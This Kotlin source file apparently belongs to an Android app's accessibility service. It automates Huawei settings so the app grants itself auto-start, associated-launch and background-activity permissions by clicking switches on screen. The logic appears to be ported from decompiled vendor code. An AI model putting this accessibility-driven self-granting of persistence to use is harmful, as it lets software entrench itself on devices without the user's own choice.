package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.AutoStartNavigator
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder
import kotlinx.coroutines.delay

/**
 * Step 5/10 -- Auto-Start Permissions (vendor m212164b1 + m212196f3, L1985-2049 + L6861-6880).
 *
 * Launches startup manager, finds our app in the list, disables "auto-manage" switch,
 * then enables the three allow-switches.
 */
class HuaweiStep5AutoStart(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep5AutoStart"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step5/10] enter executeStep5AutoStart")
        HuaweiStepLogger.phase(5, "自启动权限开始", "vendor m212164b1 + m212196f3", logs)

        if (HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)) {
            HuaweiStepLogger.skip(5, "SP STEP5_AUTOSTART 24h 内已 mark", logs)
            successes.add("[Step5/10] 自启动权限已配置（SP 幂等跳过）")
            return
        }

        val launched = try { launchStartupManager() } catch (e: Exception) {
            HuaweiStepLogger.fail(5, "启动自启动管理异常", e.message ?: "", failures)
            false
        }
        HuaweiStepLogger.probe(5, "launchStartupManager", launched)
        if (!launched) {
            HuaweiStepLogger.warn(5, "4 个 STARTUP_COMPONENTS 全部被拒",
                "直接进入 BFS 设置主页导航", logs)
            val bfsResult = navigateViaBfs(successes, failures, logs)
            if (bfsResult) return
            // BFS failed, fall through to the rest
            return
        }
        logs.add("[Step5/10] 已启动自启动管理 (vendor m212196f3 return true)")

        delay(2000L)

        val found = try {
            scrollFindAndClickApp(steps.appLabel, maxScrollPasses = 8)
        } catch (e: Exception) {
            logs.add("[Step5/10] 查找 ${steps.appLabel} 异常: ${e.message}")
            false
        }
        if (!found) {
            logs.add("[Step5/10] 启动管理列表未找到 ${steps.appLabel} (soft exit)")
            return
        }
        logs.add("[Step5/10] 已找到并点击 ${steps.appLabel} (vendor: scroll-find success)")

        delay(1500L)

        val autoManageDisabled = try { disableAutoManageSwitch() } catch (_: Exception) { false }
        if (autoManageDisabled) {
            logs.add("[Step5/10] 已关闭'自动管理'开关 (vendor: switch OFF -> 手动管理)")
            delay(500L)
        }

        val toggled = try { enableAutoStartSwitches() } catch (e: Exception) {
            logs.add("[Step5/10] enableAutoStartSwitches 异常: ${e.message}")
            0
        }

        if (toggled > 0) {
            successes.add("[Step5/10] 自启动权限: 开启 $toggled 项")
            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
            logs.add("[Step5/10] 自启动权限配置完成，开启 $toggled 项")
        } else {
            logs.add("[Step5/10] 未发现可切换的自启动开关（可能已开启或页面结构不匹配）")
        }
    }

    // ---- BFS navigation fallback ----

    private suspend fun navigateViaBfs(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        HuaweiStepLogger.phase(5, "BFS 导航: 设置主页 -> 应用和服务 -> 启动管理", "", logs)
        try {
            val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            (service ?: steps.ctx).startActivity(settingsIntent)
            delay(2000L)
        } catch (e: Exception) {
            HuaweiStepLogger.fail(5, "打开设置主页失败", e.message ?: "", failures)
            return false
        }

        // Level 1: find "应用和服务"
        var entryFound = false
        for (scrollAttempt in 0..3) {
            for (entryText in AutoStartNavigator.ENTRY_TEXTS) {
                if (ui.clickSelector("[text=\"$entryText\"][visibleToUser=true]")) {
                    HuaweiStepLogger.probe(5, "BFS 第1级命中 (scroll=$scrollAttempt)", entryText)
                    entryFound = true
                    break
                }
            }
            if (entryFound) break
            val scrollTarget = ui.query("[scrollable=true]")
            if (scrollTarget != null) {
                scrollTarget.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            } else {
                val svc = service
                if (svc != null) {
                    val w = steps.getScreenWidthPx().toFloat()
                    val h = steps.getScreenHeightPx().toFloat()
                    val path = android.graphics.Path().apply {
                        moveTo(w * 0.5f, h * 0.7f)
                        lineTo(w * 0.5f, h * 0.3f)
                    }
                    try {
                        val gesture = android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 300L))
                            .build()
                        svc.dispatchGesture(gesture, null, null)
                    } catch (_: Exception) { }
                }
            }
            delay(800L)
        }

        if (!entryFound) {
            HuaweiStepLogger.warn(5, "BFS 第1级未找到应用和服务入口", "已滚动 4 次", logs)
            return false
        }
        delay(1500L)

        // Level 2: find "应用启动管理"
        var bfsReachedManager = false
        for (mgmtText in AutoStartNavigator.MANAGER_TEXTS) {
            if (ui.clickSelector("[text*=\"$mgmtText\"][visibleToUser=true]")) {
                HuaweiStepLogger.probe(5, "BFS 第2级命中", mgmtText)
                delay(1500L)
                bfsReachedManager = true
                break
            }
        }
        if (!bfsReachedManager) {
            HuaweiStepLogger.warn(5, "BFS 第2级未找到启动管理入口", "", logs)
            return false
        }

        // Search box strategy
        HuaweiStepLogger.phase(5, "搜索框策略: 搜索 appLabel 并配置自启动", steps.appLabel, logs)
        if (!ui.clickSelector("[text=\"搜索应用\"][visibleToUser=true]")) {
            android.util.Log.d(TAG, "[Step5] 搜索应用按钮未找到, 尝试直接定位搜索框")
        }
        delay(1000L)

        val searchBoxIds = listOf(
            "android:id/search_src_text",
            "com.huawei.systemmanager:id/search_src_text"
        )
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
        var searchBox: AccessibilityNodeInfo? = null
        if (root != null) {
            for (id in searchBoxIds) {
                val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    searchBox = nodes[0]
                    break
                }
            }
        }
        if (searchBox == null) {
            HuaweiStepLogger.fail(5, "未找到搜索框", "ids=$searchBoxIds", failures)
            return false
        }
        searchBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
        val args = android.os.Bundle().apply {
            putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                steps.appLabel
            )
        }
        searchBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        HuaweiStepLogger.probe(5, "搜索框已输入", steps.appLabel)
        delay(1500L)

        val root2 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
        if (root2 != null) {
            val switcherId = "com.huawei.systemmanager:id/switcher"
            val switches = try { root2.findAccessibilityNodeInfosByViewId(switcherId) } catch (_: Exception) { null }
            if (!switches.isNullOrEmpty()) {
                val sw = switches[0]
                if (sw.isChecked) {
                    sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    HuaweiStepLogger.probe(5, "关闭自动管理 Switch", "checked=true->false")
                    delay(1500L)

                    val root3 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
                    if (root3 != null) {
                        val dialogSwitches = try {
                            root3.findAccessibilityNodeInfosByViewId(switcherId)
                        } catch (_: Exception) { null }
                        var toggled = 0
                        if (dialogSwitches != null) {
                            for (dsw in dialogSwitches) {
                                if (dsw.isCheckable && !dsw.isChecked) {
                                    dsw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    toggled++
                                    delay(300L)
                                }
                            }
                        }
                        HuaweiStepLogger.probe(5, "弹窗 Switch 开启数", toggled)

                        delay(500L)
                        val root4 = try { svc.rootInActiveWindow } catch (_: Exception) { null }
                        if (root4 != null) {
                            val btn1 = try {
                                root4.findAccessibilityNodeInfosByViewId("android:id/button1")
                            } catch (_: Exception) { null }
                            if (!btn1.isNullOrEmpty() && btn1[0].isClickable) {
                                btn1[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                HuaweiStepLogger.probe(5, "点击确定 (button1)", "ok")
                            } else {
                                ui.clickSelector("[text=\"确定\"][visibleToUser=true]")
                                HuaweiStepLogger.probe(5, "点击确定 (text)", "ok")
                            }
                        }

                        if (toggled > 0) {
                            HuaweiStepCompletionStore.markCompleted(steps.ctx,
                                HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
                            HuaweiStepLogger.success(5, "自启动配置完成",
                                "关闭自动管理 + 开启 $toggled 个 switch + 确定", successes)
                        } else {
                            HuaweiStepLogger.warn(5, "弹窗中未找到可开启的 switch", "", logs)
                        }
                    }
                } else {
                    HuaweiStepLogger.warn(5, "Switch 已是 unchecked（手动管理）", "视为已配置，mark 跳过", logs)
                    HuaweiStepCompletionStore.markCompleted(steps.ctx,
                        HuaweiStepCompletionStore.Keys.STEP5_AUTOSTART)
                    successes.add("[Step5/10] 自启动已是手动管理模式（幂等 mark）")
                }
            } else {
                HuaweiStepLogger.fail(5, "搜索结果中未找到 switcher", switcherId, failures)
            }
        }
        return true
    }

    // ---- helpers ----

    private fun launchStartupManager(): Boolean {
        for (component in HuaweiSteps.STARTUP_COMPONENTS) {
            try {
                val intent = Intent().apply {
                    setComponent(component)
                    setFlags(276824064)
                }
                val launcher: Context = service ?: steps.ctx
                launcher.startActivity(intent)
                return true
            } catch (e: Exception) {
                android.util.Log.d(TAG,
                    "[自启动] 打开失败: ${component.packageName}/${component.className} - ${e.message}")
            }
        }
        return false
    }

    private fun scrollFindAndClickApp(appLabel: String, maxScrollPasses: Int): Boolean {
        for (pass in 0 until maxScrollPasses) {
            if (ui.clickSelector("[text*=\"$appLabel\"][visibleToUser=true]")) return true
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val scrollable = ui.query("[scrollable=true]")
                if (scrollable != null) {
                    scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                }
            }
        }
        return false
    }

    private fun disableAutoManageSwitch(): Boolean {
        return ui.closeSwitch("自动管理")
    }

    private fun enableAutoStartSwitches(): Int {
        val switchTexts = listOf(
            "允许自启动", "允许关联启动", "允许后台活动",
            "允許自啟動", "允許關聯啟動", "允許後台活動"
        )
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return 0
        var toggled = 0
        for (kw in switchTexts) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) }
            catch (_: Exception) { null } ?: continue
            for (n in nodes) {
                if (!n.isVisibleToUser) continue
                val sw = findSiblingSwitch(n) ?: continue
                if (!sw.isChecked) {
                    if (sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        toggled++
                    }
                }
            }
        }
        return toggled
    }

    private fun findSiblingSwitch(textNode: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (textNode == null) return null
        if (SwitchNodeFinder.isSwitchLike(textNode) || textNode.isCheckable) return textNode
        var parent: AccessibilityNodeInfo? = try { textNode.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < 3) {
            for (i in 0 until parent.childCount) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                if (SwitchNodeFinder.isSwitchLike(child) || child.isCheckable) return child
            }
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        return null
    }
}
